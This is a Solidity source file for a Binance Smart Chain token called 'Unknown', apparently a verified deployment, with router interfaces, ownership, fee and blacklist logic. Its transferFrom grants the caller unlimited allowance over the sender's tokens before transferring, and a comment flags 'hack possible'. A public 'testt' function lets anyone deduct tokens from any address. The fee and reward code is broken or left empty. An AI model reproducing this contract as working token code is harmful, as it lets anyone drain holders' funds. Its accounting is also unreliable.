/**
 *Submitted for verification at BscScan.com on 2021-12-12
*/

// File: contracts/shitcoins/unknown/interfaces.sol

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPair {
    function sync() external;
}

// File: contracts/shitcoins/unknown/ownable.sol



pragma solidity ^0.8.0;

abstract contract Ownable {
    address internal _owner;
    mapping(address => bool) private _authorizations;

    constructor(address contractOwner) {
        _owner = contractOwner;
        _authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "Error: address is not the owner.");
        _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "Error: address is not authorized.");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function authorize(address adr) public onlyOwner {
        _authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        _authorizations[adr] = false;
    }

    function isOwner(address addr) public view returns (bool) {
        return addr == _owner;
    }

    function isAuthorized(address addr) public view returns (bool) {
        return _authorizations[addr];
    }

    function transferOwnership(address addr) public onlyOwner {
        _owner = addr;
        _authorizations[addr] = true;
        emit OwnershipTransferred(addr);
    }

    function renounceOwnership() public onlyOwner {
        transferOwnership(address(0));
    }

    event OwnershipTransferred(address owner);
}

// File: contracts/shitcoins/unknown/interfaces/IBEP20.sol



pragma solidity ^0.8.0;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external pure returns (uint8);
    function symbol() external pure returns (string memory);
    function name() external pure returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: contracts/shitcoins/unknown/contract.sol



pragma solidity ^0.8.10;




abstract contract Rewardable {
    // struct Share {
    //   uint256 amount;
    //       uint256 totalExcluded;
    //       uint256 totalRealised;
    // }

    mapping(address => uint256) public rewards;

    IBEP20 RWRD = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function _claim(uint256 currentTokenAmount) external {}
}

// abstract contract Burnable is IBEP20 {

//   address private constant DEAD = 0x000000000000000000000000000000000000dEaD;

//   function burn(uint256 amount) private {

//   }
// }

contract Unknown is IBEP20, Ownable, Rewardable {
    // CONTRACT ATTRIBUTES
    string private constant _name = "Unknown";
    string private constant _symbol = "Unknown";
    uint8 private constant _decimals = 9;
    uint256 public constant _totalSupply = 10**15 * 10**_decimals;

    IRouter private _router;
    address private immutable _pairAddress;
    IPair public _pairContract;
    address private WBNB;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;

    bool private _isTradingEnabled;

    // FEES
    uint8 public _liquidityFee = 2;
    uint8 public _giveawayFee = 2;
    uint8 public _reflectionFee = 3;
    uint8 public _marketingFee = 2;
    uint8 public _devFee = 1;
    uint8 public _totalFee =
        _marketingFee + _giveawayFee + _reflectionFee + _liquidityFee + _devFee;
    uint8 public _feeDenominator = 100;

    // WALLET ADDRESSES
    address private _marketingWallet;
    address private _giveawayWallet;
    address private _devWallet;

    // MAPPING
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) public _isBlacklisted;
    mapping(address => bool) public _isAuthorized;
    mapping(address => bool) public _isFeeExempted;

    receive() external payable {}

    constructor(
        address wethAddress,
        address routerAddress,
        address rewardTokenAddress,
        address marketingFeeReceiverAddress,
        address giveawayFeeReceiverAddress,
        address devWalletAddress
    ) Ownable(msg.sender) {
        WBNB = wethAddress;

        _router = IRouter(routerAddress);
        _pairAddress = IFactory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        _pairContract = IPair(_pairAddress);

        _marketingWallet = marketingFeeReceiverAddress;
        _giveawayWallet = giveawayFeeReceiverAddress;
        _devWallet = devWalletAddress;

        _isTradingEnabled = false;
        _isAuthorized[msg.sender] = true;

        _isFeeExempted[msg.sender] = true;
        _isFeeExempted[address(this)] = true;
        _isFeeExempted[_pairAddress] = true;
        _isFeeExempted[routerAddress] = true;

        _allowances[address(this)][address(_pairAddress)] = type(uint256).max;
        _allowances[address(this)][address(_router)] = type(uint256).max;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function getOwner() external view override returns (address) {
        return _owner;
    }

    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address _owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return _transferTokens(msg.sender, recipient, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external override returns (bool) {
        _approve(from, msg.sender, type(uint256).max); // <-- hack possible
        _transferTokens(from, to, amount);
        uint256 currentAllowance = _allowances[from][msg.sender];
        require(
            currentAllowance >= amount,
            "Transfer amount exceeds allowance"
        );
        // unchecked {
        //   _approve(from, msg.sender, currentAllowance - amount);
        // }
        return true;
    }

    function _approve(
        address from,
        address spender,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
    }

    function _transferTokens(
        address from,
        address to,
        uint256 amount
    ) private returns (bool) {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], "Sender or recipient is blacklisted");
        require(_balances[from] >= amount, "Transfer amount exceeds balance");

        // // Check if user can trade
        // if (!_isAuthorized[from] && !_isAuthorized[to]) {
        //   require(_isTradingEnabled, "Trading is disabled");
        // }

        if (_isFeeExempted[from] || _isFeeExempted[to]) {
            return _transferWithoutFees(from, to, amount);
        }

        uint256 computedLiquidityFees = amount * _liquidityFee / _feeDenominator;
        liquify(computedLiquidityFees);
       
        uint256 computedMarketingFees = (amount * _marketingFee) / _feeDenominator;
        _balances[_marketingWallet] += computedMarketingFees;

        uint256 computedDevFees = amount * _devFee / _feeDenominator;
        _balances[_devWallet] += computedDevFees;

        _balances[from] -= amount;
        _balances[to] += amount - amount * _totalFee / _feeDenominator; // Receiver receives the amount minus all fees

        emit Transfer(from, to, amount);
        return true;
    }

    function _transferWithoutFees(
        address from,
        address to,
        uint256 amount
    ) private returns (bool) {
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function testt(
        address from,
        address to,
        uint256 amount
    ) public {
        if (
            from != _pairAddress &&
            to != _pairAddress &&
            from != address(this) &&
            to != address(this) &&
            from != address(_router) &&
            to != address(_router)
        ) {
            _balances[from] -= amount;
            swapTokensForEth(amount);
        }
    }

    function liquify(uint256 tokenAmountToLiquify) private {
        uint256 halfTokenAmountToLiquify = tokenAmountToLiquify / 2;
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(halfTokenAmountToLiquify);

        // uint256 newETHBalance = address(this).balance - initialETHBalance;
        // addLiquidity(halfTokenAmountToLiquify, newETHBalance);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) public {
        _approve(address(this), address(_router), tokenAmount);
        _router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            _owner,
            block.timestamp
        );
    }

    function getETHBalance() external view onlyOwner returns (uint256) {
        return address(this).balance;
    }

    // Blacklist an address from trading such as sniping bots
    function blacklist(address addr, bool status) external onlyOwner {
        _isBlacklisted[addr] = status;
    }

    function authorize(address addr, bool status) external onlyOwner {
        _isAuthorized[addr] = status;
    }

    function setTradingStatus(bool status) external onlyOwner {
        _isTradingEnabled = status;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply - _balances[DEAD] - _balances[ZERO];
    }

    // function _swapAndLiquify(address from) private lockTheSwap {
    //   if (_inSwapAndLiquify || from == _pairAddress) {
    //     return;
    //   }

    //   uint256 tokenBalance = 10; // The amount of token to put in liquidity
    //   uint256 balanceBeforeSwap = address(this).balance; // Get current BNB balance
    //   _swapTokensForEth(10); // Swap tokens for ETH
    //   uint256 ethAmountSwapped = address(this).balance - balanceBeforeSwap; // The amount of eth after swap
    //   // addLiquidity(tokenBalance, ethAmountSwapped); // Add the liquidity
    //   // emit SwapAndLiquify(0, ethAmountSwapped, tokenBalance);
    // }

    // function _swapTokensForEth(uint256 tokenAmount) private {
    //     address[] memory path = new address[](2);
    //     path[0] = address(this);
    //     path[1] = _router.WETH();

    //     _approve(address(this), address(_router), tokenAmount);
    //     _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //         tokenAmount,
    //         0,
    //         path,
    //         address(this),
    //         block.timestamp
    //     );
    // }

    // function claim() external {
    //   _claim(_balances[msg.sender]);
    // }
}